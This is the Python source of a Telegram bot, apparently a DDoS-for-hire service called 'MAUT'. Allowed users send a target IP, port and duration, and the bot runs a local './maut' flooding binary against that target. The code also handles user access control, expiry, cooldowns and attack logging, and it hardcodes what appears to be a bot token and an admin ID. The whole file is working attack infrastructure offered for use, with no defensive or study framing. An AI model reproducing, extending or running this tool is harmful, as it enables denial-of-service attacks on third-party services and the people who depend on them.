import telebot
import subprocess
import datetime
import os
from telebot import types
import time
import re
from threading import Lock
import signal
import psutil

# Bot configuration
bot = telebot.TeleBot('7724010740:AAHl1Avs1FDKlfvTjABS3ffe6-nVhkcGCj0')
admin_id = {"8167507955"}
USER_FILE = "users.txt"
USER_TIME_LIMITS = "user_limits.txt"
LOG_FILE = "attack_logs.txt"
COOLDOWN_TIME = 600  # 5 minutes
MAX_ATTACK_TIME = 240  # 4 minutes
IMAGE_URL = "https://t.me/gggkkkggggiii/9"

# Data storage
user_attack_data = {}
maut_cooldown = {}
allowed_user_ids = []
user_time_limits = {}
active_attacks = {}  # Track active attacks {user_id: {process, start_time, duration}}
attack_lock = Lock()  # Thread lock for attack operations
processes = {}  # Track attack processes

def load_users():
    global allowed_user_ids, user_time_limits
    try:
        with open(USER_FILE, "r") as f:
            allowed_user_ids = f.read().splitlines()
    except FileNotFoundError:
        allowed_user_ids = []
    
    try:
        with open(USER_TIME_LIMITS, "r") as f:
            for line in f:
                user_id, limit_sec, expiry = line.strip().split("|")
                user_time_limits[user_id] = (int(limit_sec), float(expiry))
    except FileNotFoundError:
        user_time_limits = {}

def save_users():
    with open(USER_FILE, "w") as f:
        f.write("\n".join(allowed_user_ids))
    
    with open(USER_TIME_LIMITS, "w") as f:
        for user_id, (limit_sec, expiry) in user_time_limits.items():
            f.write(f"{user_id}|{limit_sec}|{expiry}\n")

def log_attack(user_id, target, port, time, status="Completed"):
    try:
        user = bot.get_chat(user_id)
        username = f"@{user.username}" if user.username else f"ID:{user_id}"
        with open(LOG_FILE, "a") as f:
            f.write(f"{datetime.datetime.now()} | {username} | {target}:{port} | {time}s | {status}\n")
    except Exception as e:
        print(f"Logging error: {e}")

def parse_time_input(time_str):
    time_str = time_str.lower()
    total_seconds = 0
    
    matches = re.findall(r'(\d+)\s*(day|hour|min|sec|d|h|m|s)', time_str)
    
    for amount, unit in matches:
        amount = int(amount)
        if unit in ['day', 'd']:
            total_seconds += amount * 86400
        elif unit in ['hour', 'h']:
            total_seconds += amount * 3600
        elif unit in ['min', 'm']:
            total_seconds += amount * 60
        elif unit in ['sec', 's']:
            total_seconds += amount
    
    return total_seconds if total_seconds > 0 else None

def is_attack_active():
    with attack_lock:
        return bool(active_attacks)

def add_active_attack(user_id, attack_time, process):
    with attack_lock:
        active_attacks[user_id] = {
            'process': process,
            'start_time': datetime.datetime.now(),
            'duration': attack_time
        }
        processes[user_id] = process

def remove_active_attack(user_id):
    with attack_lock:
        if user_id in active_attacks:
            if user_id in processes:
                try:
                    # Kill the entire process tree
                    process = processes[user_id]
                    try:
                        parent = psutil.Process(process.pid)
                        for child in parent.children(recursive=True):
                            try:
                                child.kill()
                            except psutil.NoSuchProcess:
                                pass
                        try:
                            parent.kill()
                        except psutil.NoSuchProcess:
                            pass
                    except psutil.NoSuchProcess:
                        pass
                except Exception as e:
                    print(f"Error killing process: {e}")
                finally:
                    if user_id in processes:
                        del processes[user_id]
            if user_id in active_attacks:
                del active_attacks[user_id]
            return True
    return False

def get_active_attack_info():
    with attack_lock:
        if not active_attacks:
            return None
        user_id, attack = next(iter(active_attacks.items()))
        elapsed = (datetime.datetime.now() - attack['start_time']).seconds
        remaining = max(0, attack['duration'] - elapsed)
        return user_id, remaining

def format_time(seconds):
    minutes, seconds = divmod(seconds, 60)
    hours, minutes = divmod(minutes, 60)
    days, hours = divmod(hours, 24)
    
    parts = []
    if days > 0:
        parts.append(f"{days}d")
    if hours > 0:
        parts.append(f"{hours}h")
    if minutes > 0:
        parts.append(f"{minutes}m")
    if seconds > 0 or not parts:
        parts.append(f"{seconds}s")
    
    return " ".join(parts)

@bot.message_handler(commands=['start'])
def start_command(message):
    caption = """
🚀 *Welcome to MAUT DDoS Bot* 🚀

*Available Commands:*
/maut <ip> <port> <time> - Start attack
/stop - Cancel ongoing attack
/mylogs - View your attack history
/help - Show all commands
/rules - Usage guidelines

*Admin Commands:*
/add <user_id> <time> - Add user
/remove <user_id> - Remove user
/allusers - List all users
/logs - View all attack logs
/clearlogs - Clear logs

⚡ *Example Attack:*
`/maut 1.1.1.1 80 60`
"""
    try:
        bot.send_photo(
            chat_id=message.chat.id,
            photo=IMAGE_URL,
            caption=caption,
            parse_mode="Markdown"
        )
    except Exception as e:
        bot.reply_to(message, caption, parse_mode="Markdown")
        print(f"Error sending image: {e}")

@bot.message_handler(commands=['maut'])
def handle_attack_command(message):
    user_id = str(message.chat.id)
    if user_id not in allowed_user_ids:
        return bot.reply_to(message, "❌ Access denied. Contact admin for access.")
    
    # Check if user already has an active attack
    if user_id in active_attacks:
        elapsed = (datetime.datetime.now() - active_attacks[user_id]['start_time']).seconds
        remaining = max(0, active_attacks[user_id]['duration'] - elapsed)
        return bot.reply_to(message, f"⚠️ You already have an active attack running. Time remaining: {format_time(remaining)}")
    
    # Check if another attack is active
    active_info = get_active_attack_info()
    if active_info and active_info[0] != user_id:
        active_user_id, remaining = active_info
        try:
            active_user = bot.get_chat(active_user_id)
            username = f"@{active_user.username}" if active_user.username else f"ID:{active_user_id}"
            return bot.reply_to(message, f"⚠️ Attack in progress by {username}. Please wait {format_time(remaining)}.")
        except:
            return bot.reply_to(message, f"⚠️ Attack in progress. Please wait {format_time(remaining)}.")
    
    # Check cooldown
    if user_id in maut_cooldown:
        remaining = COOLDOWN_TIME - (datetime.datetime.now() - maut_cooldown[user_id]).seconds
        if remaining > 0:
            return bot.reply_to(message, f"⏳ Cooldown active. Wait {format_time(remaining)}.")
    
    # Check time limit if exists
    if user_id in user_time_limits:
        limit_sec, expiry = user_time_limits[user_id]
        if time.time() > expiry:
            del user_time_limits[user_id]
            save_users()
            allowed_user_ids.remove(user_id)
            return bot.reply_to(message, "❌ Your access has expired. Contact admin.")
    
    # Parse command
    try:
        args = message.text.split()
        if len(args) != 4:
            return bot.reply_to(message, "❌ Usage: /maut <ip> <port> <time>\nExample: /maut 1.1.1.1 80 60")
        
        ip = args[1]
        port = args[2]
        attack_time = args[3]
        
        # Validate IP
        if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', ip):
            return bot.reply_to(message, "❌ Invalid IP format. Example: 1.1.1.1")
        
        # Validate port
        if not port.isdigit() or not 1 <= int(port) <= 65535:
            return bot.reply_to(message, "❌ Invalid port (1-65535)")
        
        # Validate time
        if not attack_time.isdigit() or not 1 <= int(attack_time) <= MAX_ATTACK_TIME:
            return bot.reply_to(message, f"❌ Invalid time (1-{MAX_ATTACK_TIME} seconds)")
        
        # Store attack data
        user_attack_data[user_id] = {
            'ip': ip,
            'port': port,
            'time': attack_time
        }
        
        # Show confirmation
        markup = types.InlineKeyboardMarkup()
        markup.add(
            types.InlineKeyboardButton("✅ Start Attack", callback_data="start_attack"),
            types.InlineKeyboardButton("❌ Cancel", callback_data="cancel_attack")
        )
        
        bot.send_message(
            message.chat.id,
            f"⚡ *Attack Summary:*\n\n"
            f"🌐 Target: `{ip}`\n"
            f"🔌 Port: `{port}`\n"
            f"⏱ Duration: `{attack_time}` seconds\n\n"
            f"Confirm attack:",
            parse_mode="Markdown",
            reply_markup=markup
        )
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['stop'])
def stop_attack(message):
    user_id = str(message.chat.id)
    
    if user_id not in allowed_user_ids:
        return bot.reply_to(message, "❌ Access denied.")
    
    with attack_lock:
        if user_id not in active_attacks:
            return bot.reply_to(message, "ℹ️ You don't have any active attacks to stop.")
        
        try:
            # Stop the attack
            was_active = remove_active_attack(user_id)
            
            if not was_active:
                return bot.reply_to(message, "ℹ️ No active attack found to stop.")
            
            # Update cooldown
            maut_cooldown[user_id] = datetime.datetime.now()
            
            # Log the cancellation
            if user_id in user_attack_data:
                data = user_attack_data[user_id]
                log_attack(user_id, data['ip'], data['port'], data['time'], "Cancelled")
                del user_attack_data[user_id]
            
            bot.reply_to(message, "🛑 Attack successfully stopped. Cooldown activated for 5 minutes.")
        except Exception as e:
            bot.reply_to(message, f"❌ Error stopping attack: {str(e)}")

@bot.callback_query_handler(func=lambda call: True)
def handle_buttons(call):
    user_id = str(call.message.chat.id)
    
    if call.data == "start_attack":
        if user_id not in user_attack_data:
            return bot.answer_callback_query(call.id, "❌ Session expired. Use /maut")
        
        data = user_attack_data[user_id]
        try:
            # Execute attack - create new process group
            process = subprocess.Popen(
                f"./maut {data['ip']} {data['port']} {data['time']} 900", 
                shell=True, 
                preexec_fn=os.setsid
            )
            
            # Mark attack as active
            add_active_attack(user_id, int(data['time']), process)
            
            # Log the attack
            log_attack(user_id, data['ip'], data['port'], data['time'])
            maut_cooldown[user_id] = datetime.datetime.now()
            
            # Update message
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=f"🔥 *Attack Launched!* 🔥\n\n"
                     f"🌐 Target: `{data['ip']}`\n"
                     f"🔌 Port: `{data['port']}`\n"
                     f"⏱ Duration: `{data['time']}` seconds\n\n"
                     f"🛑 Use /stop to cancel\n\n"
                     f"[⚡ Powered by @seedhe_maut_bot](https://t.me/seedhe_maut_bot)",
                parse_mode="Markdown"
            )
            
            # Schedule attack completion check
            attack_duration = int(data['time'])
            time.sleep(attack_duration)
            
            # Check if attack was manually stopped
            if user_id in active_attacks:
                # Send completion message
                bot.send_message(
                    call.message.chat.id,
                    f"✅ *Attack Completed!*\n\n"
                    f"🌐 Target: `{data['ip']}`\n"
                    f"⏱ Duration: `{data['time']}` seconds\n\n"
                    f"Cooldown: {COOLDOWN_TIME//60} minutes",
                    parse_mode="Markdown"
                )
                
                # Remove from active attacks
                remove_active_attack(user_id)
                
                # Add new attack button
                markup = types.InlineKeyboardMarkup()
                markup.add(types.InlineKeyboardButton("⚡ New Attack", callback_data="new_attack"))
                bot.send_message(call.message.chat.id, "Attack finished! You can launch a new one when cooldown ends.", reply_markup=markup)
            
        except Exception as e:
            remove_active_attack(user_id)
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=f"❌ Error: {str(e)}"
            )
    
    elif call.data == "cancel_attack":
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="❌ Attack cancelled"
        )
    
    elif call.data == "new_attack":
        if user_id in maut_cooldown:
            remaining = COOLDOWN_TIME - (datetime.datetime.now() - maut_cooldown[user_id]).seconds
            if remaining > 0:
                return bot.answer_callback_query(call.id, f"⏳ Wait {format_time(remaining)}")
        
        bot.send_message(call.message.chat.id, "⚡ Send new attack command:\n`/maut <ip> <port> <time>`", parse_mode="Markdown")
    
    bot.answer_callback_query(call.id)

# [Rest of the admin commands remain unchanged...]

# Initialize
load_users()

# Start bot
print("⚡ MAUT Bot Started ⚡")
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(f"Error: {e}")
        time.sleep(5)
